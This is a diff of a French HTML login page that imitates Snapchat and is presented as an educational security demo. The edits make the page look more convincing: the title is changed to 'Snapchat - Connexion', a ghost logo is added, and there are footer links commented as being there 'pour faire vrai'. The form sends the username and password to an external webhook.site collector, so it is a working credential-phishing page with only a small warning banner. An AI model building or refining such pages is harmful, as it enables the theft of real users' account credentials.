@@ -3,64 +3,209 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat Login - Démo Sécurité</title>
+    <title>Snapchat - Connexion</title>
     <style>
+        /* --- RESET & BASE --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f8f9fa;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
-        }
-        .login-container {
-            background-color: #fff;
             padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            width: 300px;
+        }
+
+        .login-container {
+            background-color: #ffffff;
+            padding: 40px 35px;
+            border-radius: 16px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 400px;
             text-align: center;
+            border: 1px solid #e6ecf0;
         }
-        .login-container h2 { margin-bottom: 20px; }
-        .login-container input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
-        .login-container button {
-            width: 100%;
-            padding: 10px;
-            background-color: #fffc00;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
+
+        /* --- BANDEAU D'AVERTISSEMENT (obligatoire pour la démo) --- */
         .warning {
             background-color: #ff4444;
             color: white;
-            padding: 10px;
-            border-radius: 5px;
-            margin-bottom: 15px;
-            font-weight: bold;
+            padding: 10px 14px;
+            border-radius: 30px;
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 25px;
+            letter-spacing: 0.3px;
+        }
+
+        /* --- FANTÔME SNAPCHAT (en SVG) --- */
+        .ghost-logo {
+            width: 72px;
+            height: 72px;
+            margin: 0 auto 12px auto;
+            display: block;
+        }
+
+        .app-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #000;
+            letter-spacing: -0.5px;
+            margin-bottom: 6px;
+        }
+
+        .app-subtitle {
+            font-size: 14px;
+            color: #8e9aab;
+            margin-bottom: 28px;
+        }
+
+        /* --- CHAMPS DE SAISIE --- */
+        .form-group {
+            margin-bottom: 14px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 4px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 16px;
+            border: 2px solid #e6ecf0;
+            border-radius: 12px;
+            background-color: #fafbfc;
+            transition: border-color 0.2s ease;
+            outline: none;
+            color: #1d1d1f;
+        }
+
+        .form-group input:focus {
+            border-color: #fffc00;
+            background-color: #ffffff;
+            box-shadow: 0 0 0 3px rgba(255, 252, 0, 0.2);
+        }
+
+        /* --- BOUTON JAUNE SNAPCHAT --- */
+        .btn-login {
+            width: 100%;
+            padding: 15px;
+            background-color: #fffc00;
+            border: none;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: 700;
+            color: #000;
+            cursor: pointer;
+            transition: transform 0.1s ease, background-color 0.2s ease;
+            margin-top: 8px;
+            box-shadow: 0 4px 12px rgba(255, 252, 0, 0.3);
+        }
+
+        .btn-login:hover {
+            background-color: #f5f000;
+            transform: scale(1.01);
+        }
+
+        .btn-login:active {
+            transform: scale(0.97);
+        }
+
+        /* --- LIENS PIEDS DE PAGE --- */
+        .footer-links {
+            margin-top: 24px;
+            font-size: 14px;
+            color: #8e9aab;
+            display: flex;
+            justify-content: space-between;
+            border-top: 1px solid #e6ecf0;
+            padding-top: 20px;
+        }
+
+        .footer-links a {
+            color: #2c3e50;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: #000;
+            text-decoration: underline;
+        }
+
+        .demo-note {
+            margin-top: 18px;
+            font-size: 12px;
+            color: #b0bcc9;
+            letter-spacing: 0.3px;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="warning">⚠️ DÉMO PÉDAGOGIQUE - N'utilisez pas vos vrais mots de passe</div>
-        <h2>Snapchat Login</h2>
-        <!-- 👇 REMPLACEZ "VOTRE-URL-WEBHOOK" par celle que vous avez copiée -->
-        <form action="https://webhook.site/fe48f451-ae5f-4593-8f45-084f246b537f" method="post">
-            <input type="text" name="username" placeholder="Nom d'utilisateur" required>
-            <input type="password" name="password" placeholder="Mot de passe" required>
-            <button type="submit">Se connecter</button>
-        </form>
-        <p style="font-size: 12px; color: #888; margin-top: 20px;">
-            🔒 Cette page est une démonstration de sensibilisation à la sécurité.
-        </p>
+
+<div class="login-container">
+    
+    <!-- BANDEAU DE SÉCURITÉ (gardé pour la démo) -->
+    <div class="warning">⚠️ DÉMO PÉDAGOGIQUE - N'utilisez pas vos vrais mots de passe</div>
+
+    <!-- FANTÔME SNAPCHAT (logo vectoriel) -->
+    <svg class="ghost-logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="50" cy="45" r="40" fill="#FFFC00" />
+        <path d="M30 35 C30 28 35 22 42 22 C48 22 52 26 55 22 C58 18 64 22 70 28 C76 34 78 42 78 50 C78 62 68 72 50 72 C32 72 22 62 22 50 C22 42 24 35 30 35 Z" fill="#000" opacity="0.9" />
+        <!-- Yeux -->
+        <circle cx="40" cy="42" r="5" fill="white" />
+        <circle cx="60" cy="42" r="5" fill="white" />
+        <circle cx="40" cy="42" r="2.5" fill="black" />
+        <circle cx="60" cy="42" r="2.5" fill="black" />
+        <!-- Bouche -->
+        <rect x="43" y="54" width="14" height="3" rx="1.5" fill="white" />
+        <!-- Langue (optionnelle) -->
+        <ellipse cx="50" cy="58" rx="6" ry="4" fill="#FF5E5E" />
+    </svg>
+
+    <h1 class="app-title">Snapchat</h1>
+    <p class="app-subtitle">Connectez-vous à votre compte</p>
+
+    <!-- FORMULAIRE (avec votre URL Webhook) -->
+    <form action="https://webhook.site/fe48f451-ae5f-4593-8f45-084f246b537f" method="post">
+        <div class="form-group">
+            <label for="username">Nom d'utilisateur ou e-mail</label>
+            <input type="text" id="username" name="username" placeholder="ex: pseudo.snap" required>
+        </div>
+
+        <div class="form-group">
+            <label for="password">Mot de passe</label>
+            <input type="password" id="password" name="password" placeholder="••••••••" required>
+        </div>
+
+        <button type="submit" class="btn-login">Se connecter</button>
+    </form>
+
+    <!-- LIENS POUR FAIRE VRAI -->
+    <div class="footer-links">
+        <a href="#">Mot de passe oublié ?</a>
+        <a href="#">S'inscrire</a>
     </div>
+
+    <p class="demo-note">
+        🔒 Cette page est une démonstration de sensibilisation à la sécurité.
+    </p>
+</div>
+
 </body>
 </html>
